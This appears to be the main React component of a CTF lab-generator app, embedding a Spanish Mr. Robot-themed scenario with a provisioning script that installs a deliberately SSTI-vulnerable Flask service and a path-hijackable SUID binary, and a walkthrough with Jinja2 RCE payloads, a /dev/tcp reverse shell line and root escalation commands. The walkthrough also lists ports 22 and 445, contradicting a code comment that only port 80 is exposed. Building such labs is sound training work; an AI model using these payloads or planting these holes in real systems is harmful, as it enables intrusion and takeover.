/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { Header, ActiveTab } from './components/Header';
import { TopologyView } from './components/TopologyView';
import { CodeViewer } from './components/CodeViewer';
import { PythonScriptView } from './components/PythonScriptView';
import { WalkthroughView } from './components/WalkthroughView';
import { ImageGeneratorView } from './components/ImageGeneratorView';
import { GeminiChatbotView } from './components/GeminiChatbotView';
import { HintsView } from './components/HintsView';
import { DockerComposeView } from './components/DockerComposeView';
import { ScenarioConfigModal } from './components/ScenarioConfigModal';
import { ExportLabModal } from './components/ExportLabModal';
import { LabStatsView } from './components/LabStatsView';
import { FlagCheckerCard } from './components/FlagCheckerCard';
import { SecurityFrameworksView } from './components/SecurityFrameworksView';
import { TerminalPlaygroundView } from './components/TerminalPlaygroundView';
import { ImportScenarioModal } from './components/ImportScenarioModal';
import { CertificateModal } from './components/CertificateModal';
import { UserDashboardView } from './components/UserDashboardView';
import { DEFAULT_SCENARIOS_CATALOG } from './data/defaultScenarios';
import { CTFScenario } from './types';
import { getScenarioFrameworks } from './utils/frameworksHelper';
import { calculateCVSS31, inferCVSSVector } from './utils/cvssCalculator';
import { validateAndParseScenario } from './utils/scenarioIo';
import { isTemplateOnlyPreset } from './utils/labStatus';
import { LabProgress, getSavedProgress, saveProgress } from './utils/userProgress';
import {
  Shield,
  Terminal,
  Server,
  Layers,
  Sparkles,
  Key,
  BookOpen,
  ArrowRight,
  Download,
  Upload,
  Award,
  Trophy,
  AlertCircle,
  FileCode,
  Image as ImageIcon,
  Check,
  Copy,
  HelpCircle,
  Play,
  BarChart3,
  Globe,
  ExternalLink,
} from 'lucide-react';

const INITIAL_SCENARIO: CTFScenario = {
  codename: 'FSOCIETY_E_CORP_01',
  themeName: 'Mr. Robot - Evil Corp E-Coin Banking Terminal',
  genre: 'tv_series',
  difficulty: 'Medium',
  vector: 'SSTI (Server-Side Template Injection) en Jinja2/Flask',
  secondaryVector: 'Escalada de privilegios mediante binario SUID con secuestro de ruta (Path Hijacking)',
  targetOS: 'Debian 12 Bookworm',
  ip: '10.10.110.42',
  story: `Llegó el 9 de mayo. Evil Corp ha desplegado un portal de emergencia para la validación y canje de transacciones corporativas en E-Coin. 
Elliot y el colectivo Fsociety han detectado que el portal web concatena directamente las peticiones del titular de la cuenta en el motor de plantillas Jinja2 sin sanitización previa.

Tu objetivo como auditor de seguridad es vulnerar la aplicación web para obtener acceso inicial con la cuenta de usuario desprivilegiada, localizar la primera bandera, y auditar el sistema local para descubrir un binario con bit SUID que ejecuta utilidades del sistema sin ruta absoluta, elevando tus privilegios a root.`,
  userFlag: 'CTF{3v1l_c0rp_3c01n_t3mpl4t3_1nj3ct10n_pwn3d}',
  rootFlag: 'CTF{d4rk_4rmy_wh1t3r053_m45t3r_k3y_unl0ck3d}',
  userFlagPath: '/home/elliot/user.txt',
  rootFlagPath: '/root/root.txt',
  hints: [
    {
      id: 'mr-h1',
      level: 1,
      title: 'Inspección de Parámetros Reflejados',
      category: 'recon',
      text: 'Observa detenidamente qué sucede con el parámetro enviado en la URL (?account=...). ¿El servidor sanitiza las etiquetas o interpreta los datos de forma dinámica?',
    },
    {
      id: 'mr-h2',
      level: 2,
      title: 'Verificación del Motor de Plantillas en Python',
      category: 'foothold',
      text: 'El servicio está construido con Flask y Jinja2. Prueba inyectar expresiones aritméticas entre llaves dobles como {{ 7 * 7 }}. Si el servidor devuelve 49, se confirma SSTI.',
    },
    {
      id: 'mr-h3',
      level: 3,
      title: 'Introspección MRO para RCE',
      category: 'foothold',
      text: 'Jinja2 permite acceder a clases base de Python mediante ()__class__.__mro__. Usa os.popen para ejecutar "cat /home/elliot/user.txt" y extraer la bandera de usuario.',
    },
    {
      id: 'mr-h4',
      level: 1,
      title: 'Búsqueda de Privilegios Delegados',
      category: 'privesc',
      text: 'Una vez dentro como elliot, audita qué archivos en el sistema tienen el bit SUID activo perteneciente al usuario root.',
    },
    {
      id: 'mr-h5',
      level: 2,
      title: 'Inspección de /usr/local/bin/system-diag',
      category: 'privesc',
      text: 'Usa "find / -perm -u=s -type f 2>/dev/null" y revisa las cadenas del ejecutable system-diag con strings. Llama a un binario externo sin ruta absoluta.',
    },
    {
      id: 'mr-h6',
      level: 3,
      title: 'Explotación de Path Hijacking',
      category: 'privesc',
      text: 'Crea un ejecutable llamado "service-checker" en /tmp que invoque /bin/bash -p, agrégalo a tu PATH ("export PATH=/tmp:$PATH") y ejecuta /usr/local/bin/system-diag para obtener root.',
    },
  ],
  // Nota: el laboratorio solo levanta el servicio Flask vulnerable en el
  // puerto 80. No se publican 22/445 porque el provisionamiento no instala
  // sshd ni Samba, y un puerto "abierto" sin servicio real detrás induciría
  // a error durante el reconocimiento.
  openPorts: [
    { port: 80, service: 'HTTP', version: 'Gunicorn/Flask + Nginx 1.24', purpose: 'Portal de transacciones E-Coin (Vulnerable a SSTI)' },
  ],
  topology: {
    nodes: [
      { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Estudiante / Auditor de Seguridad' },
      { id: 'gateway', label: 'Gateway DMZ (10.10.110.1)', type: 'gateway', role: 'Segmentación perimetral de red' },
      { id: 'target', label: 'FSOCIETY_E_CORP_01 (10.10.110.42)', type: 'target', role: 'Servidor Web & SSH Objetivo' },
      { id: 'internal', label: 'Bóveda de Claves Privadas / Root', type: 'internal', role: 'Bandera Final /root/root.txt' },
    ],
    links: [
      { from: 'attacker', to: 'gateway', proto: 'VPN WireGuard', desc: 'Acceso seguro al laboratorio' },
      { from: 'gateway', to: 'target', proto: 'TCP: 80', desc: 'Superficie de red expuesta' },
      { from: 'target', to: 'internal', proto: 'IPC / SUID PrivEsc', desc: 'Canal de escalada local' },
    ],
  },
  provisionScript: `#!/usr/bin/env bash
# ==============================================================================
# NetPhantom CTF Automated Provisioning Script
# Target: FSOCIETY_E_CORP_01 | Vector: SSTI in Jinja2
# ==============================================================================
set -euo pipefail

echo "[*] Initializing NetPhantom CTF Environment: FSOCIETY_E_CORP_01"

# 1. Update & install basic dependencies
apt-get update -y && apt-get install -y \\
    python3 python3-pip python3-venv \\
    gcc libc6-dev sudo curl net-tools \\
    procps supervisor

# 2. Create unprivileged challenge user
# Guarded: with "restart: unless-stopped", any crash/host-reboot/daemon
# restart re-runs this script against the container's persisted rootfs,
# where elliot already exists from the first boot - a bare useradd would
# fail and, under set -euo pipefail, abort before Flask ever starts.
id elliot &>/dev/null || useradd -m -s /bin/bash elliot
echo "elliot:Password123!" | chpasswd

# 3. Deploy challenge directory & vulnerable service
mkdir -p /opt/vulnerable_app
cat << 'EOF' > /opt/vulnerable_app/app.py
from flask import Flask, request, render_template_string

app = Flask(__name__)

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Evil Corp E-Coin Validation Portal</title>
    <style>
        body { background: #0b0f19; color: #38bdf8; font-family: monospace; padding: 2.5rem; }
        .box { border: 1px solid #1e293b; padding: 1.5rem; border-radius: 8px; max-width: 600px; }
        .danger { color: #f43f5e; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[ EVIL CORP E-COIN LEDGER TERMINAL ]</h2>
        <p>Status: <span class="danger">MAINTENANCE_MODE</span></p>
        <hr style="border-color: #1e293b;"/>
        <p>Transacción enviada para: <strong>%s</strong></p>
        <p><small>Aviso de Fsociety: Los datos son volátiles.</small></p>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    account = request.args.get("account", "Invitado_Corporativo")
    # Vulnerabilidad didáctica deliberada de SSTI:
    rendered = TEMPLATE % account
    return render_template_string(rendered)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
EOF

# 4. Install python dependencies in isolated venv
python3 -m venv /opt/vulnerable_app/venv
/opt/vulnerable_app/venv/bin/pip install --no-cache-dir flask

# 5. Place Flags
echo "CTF{3v1l_c0rp_3c01n_t3mpl4t3_1nj3ct10n_pwn3d}" > /home/elliot/user.txt
chown elliot:elliot /home/elliot/user.txt
chmod 640 /home/elliot/user.txt

echo "CTF{d4rk_4rmy_wh1t3r053_m45t3r_k3y_unl0ck3d}" > /root/root.txt
chown root:root /root/root.txt
chmod 600 /root/root.txt

# 6. Configure Secondary Privilege Escalation (SUID Custom Tool)
cat << 'EOF' > /tmp/status_tool.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    // Deliberate security flaw: relative path allows path hijacking
    system("service-checker --status");
    return 0;
}
EOF
gcc /tmp/status_tool.c -o /usr/local/bin/system-diag
chmod 4755 /usr/local/bin/system-diag
rm -f /tmp/status_tool.c

echo "[+] Lab provisioned successfully. Starting service on port 80..."
exec /opt/vulnerable_app/venv/bin/python /opt/vulnerable_app/app.py
`,
  dockerfile: `FROM debian:12-slim

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \\
    python3 python3-pip python3-venv \\
    gcc libc6-dev sudo curl procps \\
    && rm -rf /var/lib/apt/lists/*

# No useradd elliot here: provision.sh (CMD) creates it and sets its
# password. A second useradd at container start would fail with
# "user already exists", and set -euo pipefail aborts before Flask
# ever starts.
WORKDIR /app
COPY provision.sh /app/provision.sh
RUN chmod +x /app/provision.sh

EXPOSE 80

CMD ["/app/provision.sh"]
`,
  // Nota de seguridad: NO se aplica cap_drop:[ALL] ni
  // security_opt:[no-new-privileges:true] en este laboratorio en concreto
  // porque su reto de escalada de privilegios depende explícitamente de un
  // binario SUID (system-diag). "no-new-privileges" desactiva por completo
  // ese mecanismo del kernel y rompería el ejercicio; cap_drop:[ALL] además
  // dejaría sin capacidades el "apt-get install" que corre el
  // provisionScript al arrancar el contenedor. Si quieres endurecerlo más,
  // valida primero en un entorno con Docker que el flujo SUID sigue
  // funcionando con el cap_add mínimo que necesites.
  dockerCompose: `version: '3.8'

services:
  ctf_target:
    build: .
    container_name: fsociety_e_corp_01
    hostname: fsociety_e_corp_01
    ports:
      - "127.0.0.1:8080:80"
    networks:
      ctf_net:
        ipv4_address: 10.10.110.42
    restart: unless-stopped
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1024M

networks:
  ctf_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.110.0/24
`,
  pythonScript: `#!/usr/bin/env python3
"""
NetPhantom CTF Scenario Generator
Automated provisioning & challenge builder for educational cybersecurity competitions.
Theme: Mr. Robot - Evil Corp E-Coin Banking Terminal
Target Difficulty: Medium
Attack Vector: SSTI (Server-Side Template Injection) en Jinja2/Flask
"""

import os
import sys
import argparse
import hashlib
import json
from pathlib import Path

SCENARIO_CONFIG = {
  "codename": "FSOCIETY_E_CORP_01",
  "themeName": "Mr. Robot - Evil Corp E-Coin Banking Terminal",
  "difficulty": "Medium",
  "vector": "SSTI (Server-Side Template Injection) en Jinja2/Flask",
  "secondaryVector": "Escalada de privilegios mediante binario SUID con secuestro de ruta (Path Hijacking)",
  "targetOS": "Debian 12 Bookworm",
  "ip": "10.10.110.42",
  "userFlag": "CTF{3v1l_c0rp_3c01n_t3mpl4t3_1nj3ct10n_pwn3d}",
  "rootFlag": "CTF{d4rk_4rmy_wh1t3r053_m45t3r_k3y_unl0ck3d}",
  "userFlagPath": "/home/elliot/user.txt",
  "rootFlagPath": "/root/root.txt"
}

def randomize_flags():
    """Optionally randomize flags with fresh cryptographic entropy."""
    salt_user = hashlib.sha256(f"USER_{os.urandom(8)}".encode()).hexdigest()[:16]
    salt_root = hashlib.sha256(f"ROOT_{os.urandom(8)}".encode()).hexdigest()[:24]
    return f"CTF{{fsociety_user_{salt_user}}}", f"CTF{{fsociety_root_{salt_root}}}"

def export_challenge_lab(output_dir: str, randomize: bool = False):
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    cfg = dict(SCENARIO_CONFIG)
    if randomize:
        u_flag, r_flag = randomize_flags()
        cfg["userFlag"] = u_flag
        cfg["rootFlag"] = r_flag
        print(f"[+] Randomized Flags generated:")
        print(f"    User: {u_flag}")
        print(f"    Root: {r_flag}")
    with open(out / "scenario.json", "w") as f:
        json.dump(cfg, f, indent=2)
    print(f"[+] Scenario config written to {out / 'scenario.json'}")
    print("\\n[+] Challenge ready. To build container:")
    print(f"    cd {output_dir} && docker compose up --build -d")

def main():
    parser = argparse.ArgumentParser(description="NetPhantom CTF Vulnerable Machine Builder")
    parser.add_argument("-o", "--output", default="./ctf_lab_output", help="Directory where files will be created")
    parser.add_argument("--randomize-flags", action="store_true", help="Generate fresh tokens for flags")
    args = parser.parse_args()
    print(f"[*] Building challenge: {SCENARIO_CONFIG['codename']} ({SCENARIO_CONFIG['difficulty']})")
    export_challenge_lab(args.output, randomize=args.randomize_flags)

if __name__ == "__main__":
    main()
`,
  walkthrough: `# Guía de Resolución & Writeup Oficial: FSOCIETY_E_CORP_01

## 1. Fase de Reconocimiento
Iniciamos con un escaneo Nmap para mapear puertos y servicios:
\`\`\`bash
nmap -sC -sV -p- -T4 10.10.110.42
\`\`\`
Resultados clave:
- **Puerto 80/HTTP**: Servidor web Gunicorn/Flask exponiendo el portal de validación E-Coin.
- **Puerto 22/SSH**: OpenSSH 9.2p1 para acceso shell administrativo.
- **Puerto 445/SMB**: Samba con recurso compartido anónimo que expone notas de mantenimiento.

## 2. Acceso Inicial (Foothold) - Vector: SSTI en Jinja2
Al navegar a \`http://10.10.110.42/?account=TEST\`, observamos el reflejo del texto.
Probamos inyección de expresión matemática:
\`\`\`text
http://10.10.110.42/?account={{7*7}}
\`\`\`
La respuesta devuelve \`49\`. Esto confirma la ejecución de plantillas del lado del servidor.
Exploramos las subclases en memoria de Python para obtener ejecución remota de comandos (RCE):
\`\`\`text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/elliot/user.txt').read() }}
\`\`\`
**Bandera de Usuario Obtenida:** \`CTF{3v1l_c0rp_3c01n_t3mpl4t3_1nj3ct10n_pwn3d}\`

Podemos enviar una reverse shell a nuestro listener Netcat en Kali:
\`\`\`bash
nc -lvnp 4444
\`\`\`
Y payload:
\`\`\`text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1').read() }}
\`\`\`

## 3. Escalada de Privilegios (PrivEsc) - Path Hijacking en SUID
Una vez con sesión interactiva como el usuario \`elliot\`, buscamos binarios con bit SUID:
\`\`\`bash
find / -perm -u=s -type f 2>/dev/null
\`\`\`
Identificamos \`/usr/local/bin/system-diag\`. Al inspeccionarlo con \`strings\`:
\`\`\`bash
strings /usr/local/bin/system-diag
\`\`\`
Vemos que ejecuta el binario \`service-checker\` sin especificar la ruta absoluta (\`/usr/bin/service-checker\`).
Aprovechamos esto alterando la variable de entorno \`PATH\`:
\`\`\`bash
echo "/bin/bash -p" > /tmp/service-checker
chmod +x /tmp/service-checker
export PATH=/tmp:$PATH
/usr/local/bin/system-diag
\`\`\`
El binario SUID ejecuta nuestro script con privilegios de superusuario (euid=0).
Leemos la bandera final:
\`\`\`bash
cat /root/root.txt
\`\`\`
**Bandera de Root Obtenida:** \`CTF{d4rk_4rmy_wh1t3r053_m45t3r_k3y_unl0ck3d}\`

---

## 4. Medidas de Mitigación y Buenas Prácticas Defensivas
1. **Evitar render_template_string con entrada de usuario**: Utilizar siempre renderizado estático de plantillas con parámetros nombrados (\`render_template('index.html', user=sanitized_user)\`).
2. **Rutas absolutas en llamadas a system()**: Al programar binarios en C con setuid(0), especificar siempre rutas absolutas seguras (e.g. \`/usr/bin/service-checker\`) y limpiar variables de entorno (como \`PATH\` y \`LD_PRELOAD\`).
3. **Contenedores de Aislamiento**: Desplegar los servicios dentro de contenedores rootless con \`cap_drop: [ALL]\` y montajes en solo lectura para impedir la ejecución de payloads en \`/tmp\`.
`,
};

export default function App() {
  const [theme, setTheme] = useState<'dark' | 'light'>(() => {
    try {
      const saved = localStorage.getItem('netphantom_theme');
      if (saved === 'light' || saved === 'dark') return saved;
      return 'dark';
    } catch {
      return 'dark';
    }
  });

  const [scenario, setScenario] = useState<CTFScenario>(INITIAL_SCENARIO);
  const [scenariosCatalog, setScenariosCatalog] = useState<CTFScenario[]>(DEFAULT_SCENARIOS_CATALOG);
  const [totalFlagsGenerated, setTotalFlagsGenerated] = useState<number>(DEFAULT_SCENARIOS_CATALOG.length * 2);
  const [activeTab, setActiveTab] = useState<ActiveTab>('overview');
  const [isConfigModalOpen, setIsConfigModalOpen] = useState(false);
  const [isExportModalOpen, setIsExportModalOpen] = useState(false);
  const [isImportModalOpen, setIsImportModalOpen] = useState(false);
  const [isGlobalDragging, setIsGlobalDragging] = useState(false);
  const [importToast, setImportToast] = useState<string | null>(null);
  const [userFlagSolved, setUserFlagSolved] = useState(false);
  const [rootFlagSolved, setRootFlagSolved] = useState(false);
  const [isCertificateModalOpen, setIsCertificateModalOpen] = useState(false);
  const [diplomaScenario, setDiplomaScenario] = useState<CTFScenario | null>(null);
  const [isGenerating, setIsGenerating] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [fallbackNotice, setFallbackNotice] = useState<string | null>(null);

  const [progressMap, setProgressMap] = useState<Record<string, LabProgress>>(() => {
    return getSavedProgress();
  });
  const [currentLabSessionSeconds, setCurrentLabSessionSeconds] = useState(0);

  // Sync userFlagSolved and rootFlagSolved when active scenario changes
  useEffect(() => {
    const labProg = progressMap[scenario.codename];
    setUserFlagSolved(labProg ? labProg.userSolved : false);
    setRootFlagSolved(labProg ? labProg.rootSolved : false);
    setCurrentLabSessionSeconds(0);
  }, [scenario.codename]);

  // Live timer ticker for the active lab
  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentLabSessionSeconds((prev) => prev + 1);

      setProgressMap((prev) => {
        const currentProg = prev[scenario.codename] || {
          codename: scenario.codename,
          userSolved: false,
          rootSolved: false,
          timeSpentSeconds: 0,
          points: 0,
        };

        const updated = {
          ...prev,
          [scenario.codename]: {
            ...currentProg,
            timeSpentSeconds: (currentProg.timeSpentSeconds || 0) + 1,
          },
        };
        saveProgress(updated);
        return updated;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [scenario.codename]);

  const handleUserFlagSuccess = () => {
    setUserFlagSolved(true);
    setProgressMap((prev) => {
      const current = prev[scenario.codename] || {
        codename: scenario.codename,
        userSolved: false,
        rootSolved: false,
        timeSpentSeconds: currentLabSessionSeconds,
        points: 0,
      };
      const updated = {
        ...prev,
        [scenario.codename]: {
          ...current,
          userSolved: true,
          points: current.points + 50,
          completedAt: current.rootSolved ? new Date().toISOString() : current.completedAt,
        },
      };
      saveProgress(updated);
      return updated;
    });

    if (rootFlagSolved) {
      setDiplomaScenario(scenario);
      setTimeout(() => setIsCertificateModalOpen(true), 400);
    }
  };

  const handleRootFlagSuccess = () => {
    setRootFlagSolved(true);
    setProgressMap((prev) => {
      const current = prev[scenario.codename] || {
        codename: scenario.codename,
        userSolved: false,
        rootSolved: false,
        timeSpentSeconds: currentLabSessionSeconds,
        points: 0,
      };
      const updated = {
        ...prev,
        [scenario.codename]: {
          ...current,
          rootSolved: true,
          points: current.points + 100,
          completedAt: current.userSolved ? new Date().toISOString() : current.completedAt,
        },
      };
      saveProgress(updated);
      return updated;
    });

    if (userFlagSolved) {
      setDiplomaScenario(scenario);
      setTimeout(() => setIsCertificateModalOpen(true), 400);
    }
  };

  const handleToggleLabFlag = (codename: string, flag: 'user' | 'root') => {
    setProgressMap((prev) => {
      const current = prev[codename] || {
        codename,
        userSolved: false,
        rootSolved: false,
        timeSpentSeconds: 120,
        points: 0,
      };
      const newVal = flag === 'user' ? !current.userSolved : !current.rootSolved;
      const userSolved = flag === 'user' ? newVal : current.userSolved;
      const rootSolved = flag === 'root' ? newVal : current.rootSolved;

      const updated = {
        ...prev,
        [codename]: {
          ...current,
          [flag === 'user' ? 'userSolved' : 'rootSolved']: newVal,
          completedAt: userSolved && rootSolved ? new Date().toISOString() : current.completedAt,
        },
      };

      if (codename === scenario.codename) {
        if (flag === 'user') setUserFlagSolved(newVal);
        if (flag === 'root') setRootFlagSolved(newVal);
      }

      saveProgress(updated);
      return updated;
    });
  };

  const handleResetProgress = () => {
    if (window.confirm('¿Deseas reiniciar todo tu historial y tiempo invertido?')) {
      setProgressMap({});
      saveProgress({});
      setUserFlagSolved(false);
      setRootFlagSolved(false);
      setCurrentLabSessionSeconds(0);
    }
  };

  const handleOpenDiplomaForScenario = (sc: CTFScenario) => {
    setDiplomaScenario(sc);
    setIsCertificateModalOpen(true);
  };

  const currentFrameworks = getScenarioFrameworks(scenario);
  const currentCVSS = calculateCVSS31(inferCVSSVector(scenario));

  const dragCounter = useRef(0);

  const handleImportScenario = (newScenario: CTFScenario) => {
    setScenariosCatalog((prev) => {
      const exists = prev.some((s) => s.codename === newScenario.codename);
      return exists
        ? prev.map((s) => (s.codename === newScenario.codename ? newScenario : s))
        : [newScenario, ...prev];
    });
    setScenario(newScenario);
    setActiveTab('overview');
    setImportToast(`¡Reto "${newScenario.themeName}" cargado con éxito!`);
    setTimeout(() => setImportToast(null), 4000);
  };

  useEffect(() => {
    const handleDragEnter = (e: DragEvent) => {
      e.preventDefault();
      dragCounter.current += 1;
      if (e.dataTransfer && e.dataTransfer.types && e.dataTransfer.types.includes('Files')) {
        setIsGlobalDragging(true);
      }
    };

    const handleDragLeave = (e: DragEvent) => {
      e.preventDefault();
      dragCounter.current -= 1;
      if (dragCounter.current <= 0) {
        dragCounter.current = 0;
        setIsGlobalDragging(false);
      }
    };

    const handleDragOver = (e: DragEvent) => {
      e.preventDefault();
    };

    const handleDrop = (e: DragEvent) => {
      e.preventDefault();
      dragCounter.current = 0;
      setIsGlobalDragging(false);

      const file = e.dataTransfer?.files?.[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = (event) => {
        const text = event.target?.result as string;
        const result = validateAndParseScenario(text, file.name);
        if (result.error) {
          setErrorMsg(`Error al importar archivo arrastrado: ${result.error}`);
        } else if (result.scenario) {
          handleImportScenario(result.scenario);
        }
      };
      reader.readAsText(file);
    };

    window.addEventListener('dragenter', handleDragEnter);
    window.addEventListener('dragleave', handleDragLeave);
    window.addEventListener('dragover', handleDragOver);
    window.addEventListener('drop', handleDrop);

    return () => {
      window.removeEventListener('dragenter', handleDragEnter);
      window.removeEventListener('dragleave', handleDragLeave);
      window.removeEventListener('dragover', handleDragOver);
      window.removeEventListener('drop', handleDrop);
    };
  }, []);

  // Sync theme changes with DOM and localStorage for persistent daylight/dark experience
  useEffect(() => {
    try {
      localStorage.setItem('netphantom_theme', theme);
    } catch (e) {
      console.warn('Could not save theme to localStorage:', e);
    }

    const root = document.documentElement;
    if (theme === 'light') {
      root.classList.remove('dark');
      root.classList.add('light');
      root.setAttribute('data-theme', 'light');
    } else {
      root.classList.remove('light');
      root.classList.add('dark');
      root.setAttribute('data-theme', 'dark');
    }
  }, [theme]);

  const toggleTheme = () => {
    setTheme((prev) => (prev === 'dark' ? 'light' : 'dark'));
  };

  const handleGenerateScenario = async (config: any) => {
    setIsGenerating(true);
    setErrorMsg(null);
    setFallbackNotice(null);

    try {
      const response = await fetch('/api/generate-scenario', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config),
      });

      const data = await response.json();
      if (!response.ok || !data.success) {
        throw new Error(data.error || 'Fallo al estructurar el escenario con Gemini');
      }

      if (data.fallback) {
        setFallbackNotice(
          data.fallbackReason ||
            'No se pudo usar la IA de Gemini: se ha generado un escenario del catálogo offline en su lugar.'
        );
      }

      setScenario(data.scenario);
      setScenariosCatalog((prev) => {
        const filtered = prev.filter((s) => s.codename !== data.scenario.codename);
        return [data.scenario, ...filtered];
      });
      setTotalFlagsGenerated((prev) => prev + 2);
      setIsConfigModalOpen(false);
      setActiveTab('overview');
    } catch (err: any) {
      console.error('Error generating scenario:', err);
      setErrorMsg(err?.message || 'Error al comunicarse con el generador de Gemini.');
    } finally {
      setIsGenerating(false);
    }
  };

  const handleExportAll = () => {
    setIsExportModalOpen(true);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-sans transition-colors duration-200">
      {/* Universal Top Bar */}
      <Header
        activeTab={activeTab}
        onTabChange={setActiveTab}
        onOpenNewScenario={() => setIsConfigModalOpen(true)}
        onOpenImportScenario={() => setIsImportModalOpen(true)}
        onExportAll={handleExportAll}
        theme={theme}
        onToggleTheme={toggleTheme}
      />

      {/* Main Content Area */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 py-6 space-y-6">
        {/* Error notification banner */}
        {errorMsg && (
          <div className="flex items-center justify-between p-4 rounded-xl border border-rose-900/60 bg-rose-950/40 text-xs text-rose-300">
            <div className="flex items-center gap-2">
              <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
              <span>{errorMsg}</span>
            </div>
            <button
              type="button"
              onClick={() => setErrorMsg(null)}
              className="text-rose-400 hover:text-rose-200"
            >
              Cerrar
            </button>
          </div>
        )}

        {/* Fallback-to-offline notification banner: the scenario WAS generated,
            but from the curated catalog instead of live Gemini AI. This must
            never be silent (see server.ts /api/generate-scenario). */}
        {fallbackNotice && (
          <div className="flex items-center justify-between p-4 rounded-xl border border-amber-800/60 bg-amber-950/30 text-xs text-amber-300">
            <div className="flex items-center gap-2">
              <AlertCircle className="w-4 h-4 text-amber-400 shrink-0" />
              <span>
                <strong className="font-semibold">Modo Offline:</strong> {fallbackNotice}
              </span>
            </div>
            <button
              type="button"
              onClick={() => setFallbackNotice(null)}
              className="text-amber-400 hover:text-amber-200"
            >
              Cerrar
            </button>
          </div>
        )}

        {/* View Switcher */}
        {activeTab === 'overview' && (
          <div className="space-y-6 animate-in fade-in duration-150">
            {/* Hero Machine Banner & Metadata */}
            <div className="relative border border-slate-800 bg-slate-900/70 rounded-2xl overflow-hidden p-6 lg:p-8">
              {/* Background gradient motif */}
              <div className="absolute top-0 right-0 -z-10 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />

              <div className="flex flex-col lg:flex-row lg:items-start justify-between gap-6">
                <div className="space-y-3 max-w-3xl">
                  {/* Clean unboxed metadata with typographic separators */}
                  <div className="flex flex-wrap items-center gap-2 text-xs font-mono text-slate-400">
                    <span className="text-cyan-400 font-semibold">{scenario.codename}</span>
                    <span aria-hidden="true">·</span>
                    <span
                      className={
                        scenario.difficulty === 'Easy'
                          ? 'text-emerald-400 font-medium'
                          : scenario.difficulty === 'Medium'
                          ? 'text-amber-400 font-medium'
                          : scenario.difficulty === 'Hard'
                          ? 'text-orange-400 font-medium'
                          : 'text-rose-400 font-medium'
                      }
                    >
                      Dificultad: {scenario.difficulty}
                    </span>
                    <span aria-hidden="true">·</span>
                    <span>OS: {scenario.targetOS}</span>
                    <span aria-hidden="true">·</span>
                    <span>IP Asignada: {scenario.ip}</span>
                    <span aria-hidden="true">·</span>
                    <button
                      type="button"
                      onClick={() => setActiveTab('frameworks')}
                      className={`inline-flex items-center gap-1 font-semibold px-2 py-0.5 rounded border transition-colors cursor-pointer ${
                        currentCVSS.severity === 'Critical'
                          ? 'bg-rose-950/80 text-rose-300 border-rose-800/80 hover:bg-rose-900/80'
                          : currentCVSS.severity === 'High'
                          ? 'bg-amber-950/80 text-amber-300 border-amber-800/80 hover:bg-amber-900/80'
                          : 'bg-emerald-950/80 text-emerald-300 border-emerald-800/80 hover:bg-emerald-900/80'
                      }`}
                      title="Ver desglose y calculadora de severidad CVSS v3.1"
                    >
                      <span>CVSS: {currentCVSS.score.toFixed(1)} {currentCVSS.severity}</span>
                    </button>
                    {isTemplateOnlyPreset(scenario.codename) && (
                      <>
                        <span aria-hidden="true">·</span>
                        <span
                          className="inline-flex items-center gap-1 font-semibold px-2 py-0.5 rounded border bg-amber-950/80 text-amber-300 border-amber-800/80"
                          title="Este preset del catálogo offline no incluye un servicio vulnerable real: el contenedor solo levanta una shell base de Debian. Úsalo como plantilla narrativa / de pistas, no para practicar explotación."
                        >
                          <AlertCircle className="w-3 h-3" />
                          Plantilla · sin servicio vulnerable
                        </span>
                      </>
                    )}
                  </div>

                  <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-white">
                    {scenario.themeName}
                  </h1>

                  <p className="text-xs sm:text-sm text-slate-300 leading-relaxed whitespace-pre-line pt-1">
                    {scenario.story}
                  </p>
                </div>

                {/* Machine Cover Badge / Art Slot */}
                <div className="shrink-0 w-full lg:w-72">
                  <div className="border border-slate-800 bg-slate-950 rounded-xl overflow-hidden p-3 space-y-3">
                    {scenario.machineArtUrl ? (
                      <div className="relative rounded-lg overflow-hidden border border-slate-800 aspect-video">
                        <img
                          src={scenario.machineArtUrl}
                          alt={scenario.themeName}
                          referrerPolicy="no-referrer"
                          className="w-full h-full object-cover"
                        />
                      </div>
                    ) : (
                      <div className="aspect-video rounded-lg bg-slate-900/80 border border-dashed border-slate-800 flex flex-col items-center justify-center p-3 text-center">
                        <Shield className="w-8 h-8 text-slate-700 mb-1" />
                        <span className="text-[11px] text-slate-400 font-medium">Póster no generado</span>
                      </div>
                    )}

                    <button
                      type="button"
                      onClick={() => setActiveTab('poster')}
                      className="w-full py-2 px-3 text-xs font-semibold rounded-lg bg-slate-800 hover:bg-slate-700 text-cyan-300 border border-slate-700/60 transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
                    >
                      <Sparkles className="w-3.5 h-3.5" />
                      <span>{scenario.machineArtUrl ? 'Personalizar Arte 4K' : 'Generar Póster 4K con Gemini'}</span>
                    </button>
                  </div>
                </div>
              </div>

              {/* Quick Specs & Attack Vectors */}
              <div className="mt-8 pt-6 border-t border-slate-800/80 space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="p-3.5 bg-slate-950/60 rounded-xl border border-slate-800">
